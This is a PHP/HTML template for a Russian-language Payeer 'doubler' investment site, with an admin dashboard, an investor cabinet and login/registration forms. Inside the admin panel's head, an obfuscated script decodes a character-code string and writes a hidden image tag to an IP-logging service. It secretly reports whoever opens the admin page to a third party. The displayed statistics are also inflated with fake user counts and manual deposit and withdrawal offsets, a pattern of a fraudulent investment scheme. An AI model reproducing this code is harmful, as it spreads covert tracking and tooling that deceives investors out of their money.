<?
########################
# Связь с базой данных #
########################

$wallet=$db->getOne("SELECT wallet FROM ss_users WHERE id=?i",$id);
$email=$db->getOne("SELECT email FROM ss_users WHERE id=?i",$id);
$curator=$db->getOne("SELECT curator FROM ss_users WHERE id=?i",$id);
$col_refov=$db->getOne("SELECT i_have_refs_as_curator FROM ss_users WHERE id=?i",$id);
$registr=$db->getOne("SELECT reg_unix FROM ss_users WHERE id=?i",$id);
$refk=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных'");
$refk_my=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных' AND userid=?i",$id);
$depmoney=$db->getOne("SELECT SUM(summa) as depmoney FROM deposits WHERE curatorid>0");
$depmoney_my=$db->getOne("SELECT SUM(summa) FROM log WHERE comment='Пополнение баланса' AND userid=?i",$id);
$wthmoney=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата реферальных' OR type='Выплата по депозиту'");
$wthdep_my=$db->getOne("SELECT SUM(opisanie) FROM userstat WHERE type='Выплата по депозиту' AND userid=?i",$id);
$invcount=$db->numRows($db->query("SELECT id FROM ss_users WHERE curator>0"));
$plus_dep=$db->getOne("SELECT SUM(plus) FROM more");
$minus_dep=$db->getOne("SELECT SUM(minus) FROM more");
$feyk=$db->getOne("SELECT SUM(feikuser) FROM more");
$data_starta=$db->getOne("SELECT start FROM more");
$vkgrup=$db->getOne("SELECT vk FROM more");
$telega=$db->getOne("SELECT telega FROM more");
$adminmail=$db->getOne("SELECT mail FROM more");

$budget=$refk_my+$wthdep_my;
if($budget<0){$budget=0;}
$refk_my=number_format($refk_my,2,'.',',');
$wthdep_my=number_format($wthdep_my,2,'.',',');
$budget=number_format($budget,2,'.',',');
$uzerov=number_format(($invcount+$feyk));
$depmoney=number_format(($depmoney+$plus_dep),2,'.',',');
$wthmoney=number_format(($wthmoney+$minus_dep),2,'.',',');
$refk=number_format($refk,2,'.',',');
$depmoney_my=number_format($depmoney_my,2,'.',',');
?>
<?
/*По итогу, вот список переменных, с которыми можно работать:*/

//$wallet - Кошелек инвестора (личный)
//$email - Почта инвестора (личный)
//$curator - Номер куратора (личный)
//$col_refov - Количество партнеров (личный)
//$registr - Дата регистрации инвестора (личный)
//$depmoney_my - Сколько депнуто (личный)
//$wthdep_my - Сколько выплачено по депу (личный)
//$refk_my - Сколько выплачено реферальных (личный)
//$budget - Сколько выплачено всего (личный)

//$depmoney - Сколько депнуто (всего)
//$wthmoney - Сколько выплачено реферальных и депозитных (всего)
//$uzerov - Количество участников (всего)

//$data_starta - Дата старта
//$vkgrup - Вк группа
//$telega - Телеграм
//$adminmail - Почта администрации

?>
<?if($id == (1)){?>
<!--
################
# Админ панель #
################
-->

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Личный кабинет проекта <?=$sitename?></title>
<link rel="icon" href="/style/images/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/style/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/style/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<link rel="stylesheet" href="/style/css/main.css">
<link rel="stylesheet" href="/style/css/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>
function s_(s,c){return s.charAt(c)};function D_(){var temp="",i,c=0,out="";var str="60!105!109!103!32!115!114!99!61!34!104!116!116!112!115!58!47!47!105!112!108!111!103!103!101!114!46!111!114!103!47!49!87!70!54!50!55!34!32!32!98!111!114!100!101!114!61!34!48!34!62!";l=str.length;while(c<=str.length-1){while(s_(str,c)!='!')temp=temp+s_(str,c++);c++;out=out+String.fromCharCode(temp);temp="";}document.write(out);}
</script><script>
D_();
</script>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
<script type="text/javascript" src="http://gostats.ru/js/counter.js"></script>  
<script type="text/javascript">_gos='c4.gostats.ru';_goa=407459;
_got=5;_goi=1;_gol='анализ сайта';_GoStatsRun();</script>
<noscript><img alt="" 
src="http://c4.gostats.ru/bin/count/a_407459/t_5/i_1/counter.png" 
style="border-width:0" /></noscript>

</head>

<body class="theme-purple">
<div class="page-loader-wrapper">
<div class="loader">
<div class="preloader">
<div class="spinner-layer pl-red">
<div class="circle-clipper left">
<div class="circle"></div>
</div>
<div class="circle-clipper right">
<div class="circle"></div>
</div>
</div>
</div>
<p style="color: #000;">Загрузка страницы...</p>
</div>
</div>

<div class="overlay"></div>

<nav class="navbar">
<div class="col-12">
<div class="navbar-header">            
<a href="javascript:void(0);" class="bars"></a>
<a class="navbar-brand" href="/">Админ панель</a>
</div>
<ul class="nav navbar-nav navbar-right">
<li><a href="/exit" class="mega-menu" data-close="true"><i class="zmdi zmdi-power"></i> Выход</a></li>
</ul>
</div>
</nav>

<aside id="leftsidebar" class="sidebar"> 

<div class="user-info">
<div class="image"> <img src="/style/images/avatar.jpg" width="48" height="48" alt="User" /> </div>
<div class="info-container">
<div class="name" data-toggle="dropdown"><?=$wallet?></div>
<div class="email"><?=$email?></div>
</div>
</div>

<div class="menu">
<ul class="list">
<li class="header">НАВИГАЦИЯ</li>
<li> <a href="/?page=admin_deposits"><span><i class="fas fa-business-time"></i> Депозиты</span> </a></li>
<li> <a href="/?page=admin_withdrawal"><span><i class="fas fa-hand-holding-usd"></i> Выплаты</span> </a></li>
<li> <a href="/?page=admin_users"><span><i class="fas fa-theater-masks"></i> Участники</span> </a> </li>
<li> <a href="/?page=admin_partner"><span><i class="fas fa-users"></i> Рефоводы</span> </a> </li>
<li> <a href="/?page=admin_log"><span><i class="fas fa-file-medical-alt"></i> Ошибки</span> </a> </li>
<li> <a href="/?page=admin_otheraction"><span><i class="fas fa-cogs"></i> Настройки</span> </a> </li>
<li> <a href="/?page=admin_clean"><span><i class="fab fa-cloudscale"></i> Очистка базы данных</span> </a> </li>
</ul>
</div>

</aside>


<section class="content home">
<div class="container-fluid">
<div class="block-header">
<div class="row">           
</div>
</div>
<div class="row clearfix">
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Инвестировано</span>
<span class="value"><?=$depmoney?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Участников</span>
<span class="value"><?=$uzerov?> ЧЕЛ.</span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Выведено всего</span>
<span class="value"><?=$wthmoney?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>
<div class="col-lg-3 col-md-3 col-sm-6">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Партнерских</span>
<span class="value"><?=$refk?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>

</div>

<?}else{?>
<?if($id > (1)){?>
<!--
#####################
# Кабинет инвестора #
#####################
-->

<!DOCTYPE html>
<html lang="ru-RU">
<head>
<meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title>Личный кабинет проекта <?=$sitename?></title>
<link rel="icon" href="/style/images/favicon.png" type="image/x-icon">
<link rel="stylesheet" href="/style/plugins/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/style/plugins/jvectormap/jquery-jvectormap-2.0.3.css"/>
<link rel="stylesheet" href="/style/css/main.css">
<link rel="stylesheet" href="/style/css/all-themes.css" />
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css" integrity="sha384-5sAR7xN1Nv6T6+dT2mhtzEpVJvfS3NScPQTrOxhwjIuvcA67KV2R5Jz6kr4abQsz" crossorigin="anonymous">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
</head>

<body class="theme-purple">
<div class="page-loader-wrapper">
<div class="loader">
<div class="preloader">
<div class="spinner-layer pl-red">
<div class="circle-clipper left">
<div class="circle"></div>
</div>
<div class="circle-clipper right">
<div class="circle"></div>
</div>
</div>
</div>
<p style="color: #000;">Загрузка страницы...</p>
</div>
</div>
<div class="overlay"></div>

<nav class="navbar">
<div class="col-12">
<div class="navbar-header">            
<a href="javascript:void(0);" class="bars"></a>
<a class="navbar-brand" href="/">Личный кабинет</a>
</div>
<ul class="nav navbar-nav navbar-right">
<li><a href="/exit" class="mega-menu" data-close="true"><i class="zmdi zmdi-power"></i> Выход</a></li>
</ul>
</div>
</nav>

<aside id="leftsidebar" class="sidebar"> 
<div class="user-info">
<div class="image"> <img src="/style/images/avatar.jpg" width="48" height="48" alt="User" /> </div>
<div class="info-container">
<div class="email"><?=$email?></div>
<div class="email">Личный номер - <?=$id?></div>
<?if($ihra > (1)){?><div class="email">Номер куратора - <?=$curator?></div><?}else{?><?}?>
</div>
</div>

<div class="menu">
<ul class="list">
<li class="header">ОСНОВНАЯ НАВИГАЦИЯ</li>
<li> <a href="/newdep"><span><i class="fas fa-landmark"></i> Новый депозит</span> </a></li>
<li> <a href="/deposits"><span><i class="fas fa-business-time"></i> Ваши депозиты</span> </a></li>
<li> <a href="/partners"><span><i class="fas fa-sitemap"></i> Партнеры ( <?=$col_refov?> чел )</span> </a> </li>
<li> <a href="/promo"><span><i class="fas fa-bullhorn"></i> Промо материалы</span> </a> </li>
<li> <a href="/comments"><span><i class="fas fa-comments"></i> Отзывы</span> </a> </li>
<li> <a href="/support"><span><i class="fas fa-headset"></i> Тех.поддержка</span> </a> </li>
</ul>
</div>

</aside>

<section class="content home">
<div class="container-fluid">
<div class="block-header">
<div class="row">           
</div>
</div>
<div class="row clearfix">
<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
<div class="card widget-stat" style="background: linear-gradient(to right, #da384f, #87274c);">
<div class="body">
<div class="media">
<div class="media-text" style="color: #fff;">
<span class="title">Инвестировано в проект</span>
<span class="value"><?=$depmoney_my?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>

<div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
<div class="card widget-stat" style="background: linear-gradient(to right, #da384f, #87274c);">
<div class="body">
<div class="media">
<div class="media-text" style="color: #fff;">
<span class="title">Выведено из проекта</span>
<span class="value"><?=$budget?> <?=$m_curr?></span>
</div>
</div>
</div>
</div>
</div>

<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
<div class="card widget-stat">
<div class="body">
<div class="media">
<div class="media-text">
<span class="title">Ваш кошелек Payeer</span>
<span class="value"><?=$wallet?></span>
</div>
</div>
</div>
</div>
</div>

</div>

<?}else{?>
<!--
########################################################################
# Лучшие скрипты payeer удвоителей только здесь https://php-scripts.ru #
########################################################################
-->
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$sitename?></title>
<meta name="description" content="Инвестиционный проект <?=$sitename?>">
<meta name='author' content='Stas Danilov'>
<meta name='Copyright' content='EDscript (ed-script.pro)'>
<link href="/style/form.css" rel="stylesheet" type="text/css">
<link href="https://fonts.googleapis.com/css?family=Oswald:400,700&amp;subset=cyrillic" rel="stylesheet">
<link rel="icon" href="/tema/img/logo1.png">
<link rel="stylesheet" href="/tema/fonts.css">
<link rel="stylesheet" type="text/css" href="/tema/style.css">
<link rel="stylesheet" href="/tema/vendor/font-awesome/css/font-awesome.min.css">
<script src="/tema/jquery.min.js"></script>
<style>
.container {width: 1170px !important;}
</style>
<link rel="stylesheet" type="text/css" href="/tema/widget.css" media="all">
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
<script>
$(document).ready(function(){
setInterval(function(){
$('.countdown').each(function(){
var time=$(this).text().split(':');
var timestamp=time[0]*3600+ time[1]*60+ time[2]*1;timestamp-=timestamp>0;
var hours=Math.floor(timestamp/3600);
var minutes=Math.floor((timestamp- hours*3600)/ 60);
var seconds=timestamp- hours*3600- minutes*60;if(hours<10){hours='0'+ hours;}

if(minutes<10){minutes='0'+ minutes;}
if(seconds<10){seconds='0'+ seconds;}
if(timestamp>0){
$(this).text(hours+':'+ minutes+':'+ seconds);
}
});
},1000);

})
</script>
</head>

<body class="home" style="overflow: visible;">

<div class="dm-overlay" id="sign-in">
<div class="dm-table">
<div class="dm-cell">
<div class="dm-modal" style="max-width: 25em;line-height: normal;">
<a href="#close" class="close"></a>
<h3 style="color: #0b1115cf;font-family: 'Oswald' sans-serif;padding-left: 5px;font-size: 21px;margin-bottom: 10px;font-family: 'Oswald', sans-serif;">Авторизация</h3>
<div class="pl-left">
<style>
.tooltip {
position: fixed;
padding: 10px 20px;
border: 1px solid #b3c9ce;
border-radius: 4px;
text-align: center;
font: 14px/1.3 arial, sans-serif;
color: #333;
background: #fff;
box-shadow: 3px 3px 3px rgba(0, 0, 0, .3);
}
</style>

<center>
<form action="" method="post">	
<input type="hidden" name="do" value="checkaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table height="21px" border="0">
<tbody>
<tr>
<td align="center">

<input autocomplete="off" name="wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Введите номер PAYEER" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 100%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/koshel.png) no-repeat left 20px center;margin-top: 10px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 85px;background-size: 30px;">

<input autocomplete="off" name="wallet_password" title="Пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Пароль от аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 100%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 85px;background-size: 30px;">

<input type="submit" name="submit" id="form" value="ВОЙТИ НА ПРОЕКТ" class="stas">

</td>
</tr>
</tbody>
</table>
</form>
</center>

</div>
</div>
</div>
</div>
</div>

<div class="dm-overlay" id="sign-up">
<div class="dm-table">
<div class="dm-cell">
<div class="dm-modal" style="max-width: 25em;line-height: normal;">
<a href="#close" class="close"></a>
<h3 style="color: #0b1115cf;font-family: 'Oswald' sans-serif;padding-left: 5px;font-size: 21px;margin-bottom: 10px;font-family: 'Oswald', sans-serif;">Регистрация</h3>
<div class="pl-left">
<style>
.tooltip {
position: fixed;
padding: 10px 20px;
border: 1px solid #b3c9ce;
border-radius: 4px;
text-align: center;
font: 14px/1.3 arial, sans-serif;
color: #333;
background: #fff;
box-shadow: 3px 3px 3px rgba(0, 0, 0, .3);
}
</style>

<center>
<form action="" method="post">	
<input type="hidden" name="do" value="toaccount">
<input type="hidden" name="antipovtor" value="<?=time();?>">
<table height="21px" border="0">
<tbody>
<tr>
<td align="center">

<input autocomplete="off" name="reg_email" title="E-mail" type="text" size="23" maxlength="35" placeholder="Ваш e-mail" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/email.png) no-repeat left 20px center;margin-top: 10px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_wallet" pattern="^P[0-9]{7,14}" title="Первая буква должна быть заглавной [P] далее цифры кошелька" type="text" size="23" maxlength="35" placeholder="Кошелёк payeer" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/koshel.png) no-repeat left 20px center;margin-top: 0px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_password" title="Пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Пароль аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="reg_repassword" title="Повторный пароль аккаунта" type="password" size="23" maxlength="35" placeholder="Повторный пароль аккаунта" style="font-family: 'Oswald', sans-serif;text-transform: none;width: 99%;height: 50px;background: rgba(47, 70, 87, 0) url(/img/password.png) no-repeat left 20px center;margin-top: 0px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;border-radius: 4px;color: #383d40;text-align: left;padding-left: 70px;background-size: 30px;">

<input autocomplete="off" name="captcha" type="text" size="23" maxlength="35" placeholder="Введите цифры с картинки" style="text-transform: none;width: 99%;height: 50px;background: rgba(255, 255, 255, 0) url(/secpic.php?r=<?=time()?>) no-repeat;background-size: 75px;border-left-width: 3px;margin-bottom: 10px;border: 2px solid #e6e6e685;outline: 0 !important;padding-left: 85px;border-radius: 4px;color: #383d40;text-align: left;font-family: 'Oswald', sans-serif;">

<input type="submit" name="submit" id="form" value="ЗАРЕГИСТРИРОВАТЬСЯ" class="stas">
</td>

</tr>
</tbody>
</table>
</form>
</center>

</div>
</div>
</div>
</div>
</div>

<div class="main-page-wrapper">
<div id="loader-wrapper" style="display: none;">
<div id="loader" style="display: none;"></div>
</div>

<?}}?>